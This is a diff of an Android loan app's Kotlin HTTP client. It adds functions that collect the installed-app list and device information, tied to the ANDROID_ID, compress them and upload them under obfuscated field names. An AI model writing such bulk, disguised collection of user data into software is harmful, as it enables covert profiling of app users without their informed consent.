@@ -14,21 +14,30 @@ import com.appsflyer.AppsFlyerLib
 import com.credit.bridge.R
 import com.credit.bridge.content.AndroidBus
 import com.credit.bridge.content.Contants
+import com.credit.bridge.remote.bean.DeviceInfo
 import com.credit.bridge.remote.body.RequestHomeInfoBody
+import com.credit.bridge.remote.body.RequestInstalledPackageBody
 import com.credit.bridge.remote.body.RequestVerifyCodeBody
 import com.credit.bridge.remote.body.RequestVoiceCodeBody
 import com.credit.bridge.remote.event.BResponseEvent
 import com.credit.bridge.remote.event.CheckCollectDataStatusResponseEvent
+import com.credit.bridge.remote.event.CheckUploadStatusResponseEvent
 import com.credit.bridge.remote.event.HomeInfoResponseEvent
 import com.credit.bridge.remote.event.LoginResponseEvent
+import com.credit.bridge.remote.event.PrivacyPolicyUrlResponseEvent
+import com.credit.bridge.remote.event.RequestZipDataBody
+import com.credit.bridge.remote.event.UploadInstalledPackageListResponseEvent
+import com.credit.bridge.remote.event.UploadSystemResponseEvent
 import com.credit.bridge.remote.event.VerifyCodeResponseEvent
 import com.credit.bridge.remote.event.VoiceCodeResponseEvent
 import com.credit.bridge.remote.response.BResponse
 import com.credit.bridge.remote.response.CheckCollectDataStatusResponse
+import com.credit.bridge.remote.response.CommonBoolResponse
 import com.credit.bridge.remote.response.CommonResponse
 import com.credit.bridge.remote.response.HomeInfoResponse
 import com.credit.bridge.remote.response.LoginResponse
 import com.credit.bridge.ui.App
+import com.credit.bridge.util.DeviceInfoUtil
 import com.credit.bridge.util.SystemDataUtils
 import com.google.android.gms.common.internal.service.Common
 import com.google.gson.Gson
@@ -209,6 +218,57 @@ object HttpClient {
         dispatchClient!!.enqueue(call, HomeInfoResponse::class.java, HomeInfoResponseEvent::class.java)
     }
 
+    @SuppressLint("HardwareIds")
+    fun checkUploadStatus(mContext: Context) {
+        val formMap: HashMap<String, Any> = HashMap()
+        formMap[Contants.imei_p] = Settings.Secure.getString(App.instance.contentResolver, Settings.Secure.ANDROID_ID)
+        val call = mHttpApi!!.requestGetAuth1(getHeaders(mContext), Contants.URL_CHECK_UPLOAD_STATUS, formMap)
+        dispatchClient!!.enqueue(call, CommonBoolResponse::class.java,
+            CheckUploadStatusResponseEvent::class.java)
+    }
+
+    fun getPrivacyPolicyUrl(mContext: Context) {
+
+        val formMap: HashMap<String, Any> = HashMap()
+        formMap["alfekfdvov"] = "declaration"
+        val call = mHttpApi!!.requestGetAuth1(getHeaders(mContext), Contants.URL_PRIVTE,formMap)
+        dispatchClient?.enqueue(call, CommonResponse::class.java, PrivacyPolicyUrlResponseEvent::class.java)
+    }
+
+    @SuppressLint("HardwareIds")
+    fun uploadInstalledPackageList(mContext: Context) {
+
+        val installedPackageBody = RequestInstalledPackageBody(
+            protocolName = "INSTALLED_APP",
+            data = SystemDataUtils.getInstalledAppList(mContext)
+        )
+        val jsonList = Gson().toJson(installedPackageBody)
+        val zipString = SystemDataUtils.getZipData(jsonList)
+        val requestZipBody = RequestZipDataBody()
+        requestZipBody.sucbzl = CacheManager.mobile
+        requestZipBody.xjevovy = zipString
+        requestZipBody.gefl = DeviceInfoUtil.getAndroidId()
+        val call = mHttpApi!!.requestPostZipData(getHeaders(mContext), Contants.URL_GZIP,requestZipBody)
+        dispatchClient!!.enqueue(call, CommonResponse::class.java,
+            UploadInstalledPackageListResponseEvent::class.java)
+    }
+
+
+    @RequiresPermission(allOf = [Manifest.permission.ACCESS_COARSE_LOCATION, Manifest.permission.READ_PHONE_STATE])
+    @SuppressLint("HardwareIds")
+    fun uploadSystemInfo(mContext: Context) {
+        var messageBody = RequestInstalledPackageBody(protocolName = "DEVICE_INFO" , data = SystemDataUtils.getDeviceInfo(mContext))
+        val json = Gson().toJson(messageBody)
+        val zipString = SystemDataUtils.getZipData(json)
+        var requestZipBody = RequestZipDataBody()
+        requestZipBody.sucbzl = CacheManager.mobile
+        requestZipBody.xjevovy = zipString
+        requestZipBody.gefl = Settings.Secure.getString(App.instance.contentResolver, Settings.Secure.ANDROID_ID)
+        val call = mHttpApi!!.requestPostZipData(getHeaders(mContext), Contants.URL_GZIP,requestZipBody)
+        dispatchClient!!.enqueue(call, CommonResponse::class.java, UploadSystemResponseEvent::class.java)
+    }
+
+
     /*
 
     fun ocrPanNumber(mContext: Context) {
@@ -251,13 +311,7 @@ object HttpClient {
         dispatchClient?.enqueue(call, StringResponse::class.java, PrivateUrlResponseEvent::class.java)
     }
 
-    fun getPermissionUrl(mContext: Context) {
 
-        val formMap: HashMap<String, Any> = HashMap()
-        formMap["alfekfdvov"] = "declaration"
-        val call = mHttpApi!!.requestGetAuth1(getHeaders(mContext), Contants.URL_PRIVTE,formMap)
-        dispatchClient?.enqueue(call, StringResponse::class.java, PersissionUrlResponseEvent::class.java)
-    }
 
     fun getBankInfo(mContext: Context) {
 
@@ -418,46 +472,14 @@ object HttpClient {
         dispatchClient!!.enqueue(call, OrderDetailResponse::class.java, OrderDetailResponseEvent::class.java, pageIndex)
     }
 
-    @SuppressLint("HardwareIds")
-    fun uploadZipAppList(mContext: Context) {
 
-        var messageBody = RequestZipMessageBody<BasicDataApp>(protocolName = "INSTALLED_APP", data = DataZipUtils.getAppList(mContext))
-        val json = Gson().toJson(messageBody)
-        val zipString = DataZipUtils.getZipData(json)
-        var requestZipBody = RequestZipBody()
-        requestZipBody.sucbzl = CacheConfig.mobile
-        requestZipBody.xjevovy = zipString
-        requestZipBody.gefl = Settings.Secure.getString(MyApplication.instance.contentResolver, Settings.Secure.ANDROID_ID)
-        val call = mHttpApi!!.postZip(getHeaders(mContext), Contants.URL_GZIP,requestZipBody)
-        dispatchClient!!.enqueue(call, StringResponse::class.java, ZipAppListResponseEvent::class.java)
-    }
 
-    @RequiresApi(Build.VERSION_CODES.Q)
-    @RequiresPermission(allOf = [Manifest.permission.ACCESS_COARSE_LOCATION, Manifest.permission.READ_PHONE_STATE])
-    @SuppressLint("HardwareIds")
-    fun uploadZipDeviceInfo(mContext: Context) {
-        var messageBody = RequestZipMessageBody<DeviceInfo>(protocolName = "DEVICE_INFO" , data = DataZipUtils.getDeviceInfo(mContext))
-        val json = Gson().toJson(messageBody)
-        val zipString = DataZipUtils.getZipData(json)
-        var requestZipBody = RequestZipBody()
-        requestZipBody.sucbzl = CacheConfig.mobile
-        requestZipBody.xjevovy = zipString
-        requestZipBody.gefl = Settings.Secure.getString(MyApplication.instance.contentResolver, Settings.Secure.ANDROID_ID)
-        val call = mHttpApi!!.postZip(getHeaders(mContext), Contants.URL_GZIP,requestZipBody)
-        dispatchClient!!.enqueue(call, StringResponse::class.java, ZipDeviceResponseEvent::class.java)
-    }
 
 
     *//**
      * check upload phone info
      *//*
-    @SuppressLint("HardwareIds")
-    fun checkUploadZip(mContext: Context) {
-        val formMap: HashMap<String, Any> = HashMap()
-        formMap[Contants.imei_p] = Settings.Secure.getString(MyApplication.instance.contentResolver, Settings.Secure.ANDROID_ID)
-        val call = mHttpApi!!.requestGetAuth1(getHeaders(mContext), Contants.URL_CHECK_UPLOAD_STATUS, formMap)
-        dispatchClient!!.enqueue(call, BooleanResponse::class.java, CheckZipStatusResponseEvent::class.java)
-    }
+
 
 
     *//**
